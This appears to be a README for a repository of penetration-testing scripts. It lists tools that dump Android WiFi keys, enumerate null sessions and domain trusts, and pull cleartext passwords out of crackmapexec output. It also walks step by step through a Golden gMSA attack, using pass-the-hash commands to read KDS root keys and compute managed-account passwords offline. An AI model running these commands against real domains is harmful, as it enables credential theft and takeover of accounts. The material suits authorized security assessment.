# GPT Tools

A collection of tools created with the help of ChatGPT - a powerful language model developed by OpenAI.

## Tools
- `androkey`: A tool for dumping Android WiFi SSIDs and the corresponding cleartext key material.
- `check_null`: A tool for checking null sessions on domain controllers and dumping usernames.
- `lsaPeeker`: A tool for parsing the output of crackmapexec --lsa to find any cleartext passwords.
- `parallelHostResolve`: A tool to resolve hostnames in parallel for speed.
- `ftp_check.py`: A tool to check for anonymous FTP and list their contents.
- `get_urls.py`: A tool to extract HTTP URLs from masscan XML files.
- `host_resolver.py` : A multithreaded tool to resolve multiple hostnames. (Corrected the typo in 'multiple')
- `easy_scope.py` : A tool to convert files of IPs to CIDR notation or vice versa.
- `mass_effect.py` : Python port of the mass-effect.py tool.
- `rc4_check.py` : A tool to check if RC4 is enabled on Windows hosts.
- `trusts.py` : A tool to enumerate domain trusts.
- `goldengmsa.py` : A cross-platform Impacket implementation for enumerating
  Golden gMSA material, identifying permitted readers, and computing gMSA
  credentials offline.


## Usage

To use any of the tools in this repository, simply clone the repository to your local machine and run the tool's Python script.

For example, to use `androkey`:

1. Clone the `gpt_tools` repository: `git clone https://github.com/sho-luv/gpt_tools.git`
2. Connect rooted Android device.
2. Run the Python script: `python androkey.py`

## GoldenGMSA

`goldengmsa.py` runs on macOS and Linux. It uses Impacket for LDAP, NTLM,
pass-the-hash, and Kerberos authentication, and declares its runtime
dependencies directly in the script for `uv`.

```bash
uv run goldengmsa.py --help
```

The authentication target follows the Impacket convention:
`domain/username[:password][@target]`. An inline password, `-hashes`, `-k`, or
`-aesKey` prevents a password prompt automatically. Use `-no-pass` only when
you intentionally want no prompt and are not supplying another credential.

Start by enumerating the gMSA data and its possible readers:

```bash
uv run goldengmsa.py gmsainfo \
  'corp.local/auditor@dc01.corp.local' -hashes ':AUDITOR_NT_HASH'

uv run goldengmsa.py readers \
  'corp.local/auditor@dc01.corp.local' -hashes ':AUDITOR_NT_HASH'
```

`readers` prints direct ACL trustees and expands their actual user and computer
members beneath them by default. It also prints candidate pass-the-hash
commands for accounts that may read each KDS root key. Use
`--no-expand-groups` only when you want to inspect the direct trustees without
group expansion.

Use the hash of one of the listed KDS reader accounts to retrieve the key. Pass
the SID and password ID printed by `gmsainfo` so the next command contains
everything needed for offline computation:

```bash
uv run goldengmsa.py kdsinfo \
  'corp.local/Administrator@dc01.corp.local' -hashes ':READER_NT_HASH' \
  --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb \
  --sid S-1-5-21-1437000690-1664695696-1586295871-1112 \
  --pwdid '<BASE64_MANAGED_PASSWORD_ID>' \
  --show-secrets
```

The `kdsinfo` output prints a complete command containing the extracted
`--kdskey`, `--sid`, and `--pwdid` values:

```bash
uv run goldengmsa.py compute \
  --sid S-1-5-21-1437000690-1664695696-1586295871-1112 \
  --kdskey '<EXTRACTED_BASE64_KDS_KEY>' \
  --pwdid '<BASE64_MANAGED_PASSWORD_ID>' \
  --show-secrets
```

Kerberos authentication uses the current ccache:

```bash
KRB5CCNAME=user.ccache uv run goldengmsa.py readers \
  'corp.local/user@dc01.corp.local' -k
```

Use this functionality only on systems you own or are explicitly authorized
to assess. Treat extracted KDS keys and credential material as secrets.

## License

This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
